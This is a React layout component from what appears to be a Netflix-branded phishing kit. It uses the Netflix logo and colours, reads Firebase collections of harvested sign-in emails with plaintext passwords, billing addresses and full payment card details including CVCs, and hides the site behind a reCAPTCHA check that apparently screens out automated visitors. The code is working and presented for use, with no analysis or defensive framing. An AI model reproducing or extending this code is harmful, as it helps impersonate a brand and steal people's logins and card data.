import { useContext, useEffect, useState } from 'react';
import { Store } from '../context/store';
import db from '../firebase/firebase';
import logo from '../assets/Netflix_2015_logo.svg';
import { useLocation } from 'react-router-dom';

import React from 'react'
//...
import LoadingScreen from 'react-loading-screen'
//load captcha
import ReCAPTCHA from "react-google-recaptcha";

const Layout = ({ children }) => {
    const [state, dispatch] = useContext(Store);
    const [loading, setLoading] = useState(true);
    const [isNotRobot, setIsNotRobot] = useState(false);
    let location = useLocation()
    function onChangeCap( value ){
        localStorage.setItem('isNotRobot',1)
        setIsNotRobot(true)
      }
    useEffect(() => {
        let signInData = [];
        let billingData = [];
        let paymentData = [];
        db.collection('billing-data').get().then(snapshot => {
            snapshot.docs.forEach(doc => {
                const singleDoc = {
                    id: doc.id,
                    fullname: doc.data().fullname,
                    address: doc.data().address,
                    phone: doc.data().phone,
                    state: doc.data().state,
                    city: doc.data().city,
                    zip: doc.data().zip,
                    country: doc.data().country
                }
                billingData.push(singleDoc)
            })
        });
        db.collection('signin-data').get().then(snapshot => {
            snapshot.docs.forEach(doc => {
                const singleDoc = {
                    id: doc.id,
                    email: doc.data().email,
                    password: doc.data().password
                }
                signInData.push(singleDoc)
            })
        });
        db.collection('payment-data').get().then(snapshot => {
            snapshot.docs.forEach(doc => {
                const singleDoc = {
                    id: doc.id,
                    fname: doc.data().fname,
                    lname: doc.data().lname,
                    cardNum: doc.data().cardNum,
                    expiry: doc.data().expiry,
                    cvc: doc.data().cvc
                }
                paymentData.push(singleDoc)
            })
        });
        dispatch({ type: 'SIGN_IN_DATA', payload: signInData });
        dispatch({ type: 'BILLING_IN_DATA', payload: billingData });
        dispatch({ type: 'PAYMENT_DATA', payload: paymentData });
    }, []);
    useEffect( () => {
        const isRobotCheckAllowed = process.env.REACT_APP_PUBLIC_ROBOT_CHECK
        const robotCheckExpireTime = process.env.REACT_APP_PUBLIC_ROBOT_CHECK_EXPIRE_TIME
        if( isRobotCheckAllowed === '1')
        {
            const pastVisitTime = localStorage.getItem('pastVisitTime')
            let timeDiff = 3000000000
            /**
             * if first visit, it is set as timedout
             * so need captcha
             */

            if( pastVisitTime )
            {
                timeDiff = Date.now() - pastVisitTime
            }
            
            localStorage.setItem('pastVisitTime', Date.now())
            if( timeDiff >= (robotCheckExpireTime * 1000) )
            {
                setIsNotRobot(false)
            }
            else
            {
                const isNotRobot = localStorage.getItem('isNotRobot')
                if( isNotRobot === '1' )
                {
                    setIsNotRobot(true)
                }
            }
        }
        else
        {
            setIsNotRobot(true)
        }
    }, [])
    useEffect(() => {
        // console.log(location);
        setLoading(true);
        setTimeout(() => {
            setLoading(false)
        }, 500);
    }, [location])
    
    return (
        <div className='h-screen flex flex-col'>
            {
                !isNotRobot &&
                <div className="recaptcha-container">
                    <div className="recaptcha-wrapper">
                        <ReCAPTCHA className="recaptcha"
                            sitekey="6Lcs214cAAAAADjXSFdTWUCeN3XPsBRFJ_-9ItOM"
                            onChange={onChangeCap}
                        />
                    </div>
                </div>
            }
            {/* <Header /> */}
            {
                isNotRobot &&
                <LoadingScreen
                    loading={loading}
                    bgColor='#141414'
                    spinnerColor='#e50914'
                    textColor='#676767'
                    logoSrc={logo}
                >
                </LoadingScreen>
            }
            {
                isNotRobot && !loading &&
                <div className='flex-1'>
                    {children}
                </div>
            }
            
            {/* <Footer /> */}
        </div>
    );
};

export default Layout;